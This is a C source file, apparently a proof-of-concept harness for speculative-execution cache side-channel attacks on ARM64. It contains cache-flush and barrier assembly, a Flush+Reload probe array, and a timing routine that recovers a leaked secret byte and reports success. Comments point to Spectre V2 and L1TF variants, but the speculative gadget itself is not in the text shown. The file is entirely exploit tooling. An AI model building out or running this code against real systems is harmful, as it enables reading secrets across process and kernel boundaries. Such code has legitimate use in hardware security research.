#include <stdio.h>
#include <stdint.h>
#include <string.h>   // For memset
#include <setjmp.h>   // For sigsetjmp/siglongjmp to handle faults
#include <signal.h>   // For signal handling
#include <unistd.h>   // For getpagesize()
#include <sys/mman.h> // For mmap/munmap (used in L1TF example)
#include <time.h>     // For clock_gettime as alternative to rdtsc

// Define cache line size (common for ARM64)
#define CACHE_LINE_SIZE 64
// For a 256-entry probe array (0-255 possible byte values)
#define NUM_CACHE_LINES 256
#define PROBE_ARRAY_SIZE (NUM_CACHE_LINES * CACHE_LINE_SIZE)

// Global probe array for cache side-channel attacks
uint8_t probe_array[PROBE_ARRAY_SIZE];

// ARM64 cache flush instruction (DC CIVAC - Clean and Invalidate to Point of Coherency)
static inline void arm64_clflush(volatile void *addr)
{
    __asm__ volatile("dc civac, %0" : : "r"(addr) : "memory");
}

// ARM64 memory barrier (DSB - Data Synchronization Barrier)
static inline void arm64_mfence()
{
    __asm__ volatile("dsb sy" : : : "memory");
}

// ARM64 load fence (DSB - Data Synchronization Barrier)
static inline void arm64_lfence()
{
    __asm__ volatile("dsb ld" : : : "memory");
}

// Function to flush the probe_array from cache
void flush_probe_array()
{
    for (int i = 0; i < NUM_CACHE_LINES; i++)
    {
        arm64_clflush(&probe_array[i * CACHE_LINE_SIZE]);
    }
    arm64_mfence(); // Ensure flushes are complete and ordered
}

// High-resolution timing using clock_gettime (portable alternative to rdtsc)
static inline uint64_t get_time_ns()
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

// Function to measure cache access time for a specific address
// Returns time in nanoseconds
long long measure_access_time(volatile uint8_t *addr)
{
    uint64_t start_time, end_time;
    start_time = get_time_ns();
    volatile uint8_t dummy = *addr; // Access the memory
    arm64_mfence();                 // Ensure access completes before reading time
    end_time = get_time_ns();
    return end_time - start_time;
}

// Placeholder for a benign target function, used in some Spectre V2-like scenarios
__attribute__((noinline)) void benign_target()
{
    // Does nothing, just a valid call target
}

// Initial setup for main functions
void common_init()
{
    memset(probe_array, 0, PROBE_ARRAY_SIZE);
    // Ensure probe_array is in cache initially to avoid false misses during flush test
    // Not strictly necessary but can help for consistency
    for (int i = 0; i < PROBE_ARRAY_SIZE; i += CACHE_LINE_SIZE)
    {
        probe_array[i] = 1;
    }
    arm64_mfence();
    flush_probe_array(); // Clear it out for fresh start
    arm64_mfence();
}

// Common function for cache timing measurement phase
int perform_measurement(uint8_t expected_secret, const char *secret_name)
{
    printf("Measuring cache timings...\n");
    int leaked_byte = -1;
    long long min_time = -1;
    int CACHE_HIT_THRESHOLD = 100; // Nanoseconds, tune based on system (often 50-200ns for L1 hit)

    for (int i = 0; i < NUM_CACHE_LINES; i++)
    {
        volatile uint8_t *addr = &probe_array[i * CACHE_LINE_SIZE];
        long long access_time = measure_access_time(addr);

        if (access_time < CACHE_HIT_THRESHOLD && (min_time == -1 || access_time < min_time))
        {
            min_time = access_time;
            leaked_byte = i;
        }
    }

    if (leaked_byte != -1)
    {
        printf("Leaked %s (speculatively): %c (ASCII %d), Access Time: %lld ns\n",
               secret_name, (char)leaked_byte, leaked_byte, min_time);
        if (leaked_byte == expected_secret)
        {
            printf("SUCCESS! Leaked the actual %s.\n", secret_name);
            return 1;
        }
        else
        {
            printf("LEAKED VALUE DOES NOT MATCH ACTUAL %s.\n", secret_name);
            return 0;
        }
    }
    else
    {
        printf("No %s leaked or could not detect leakage.\n", secret_name);
        return 0;
    }
}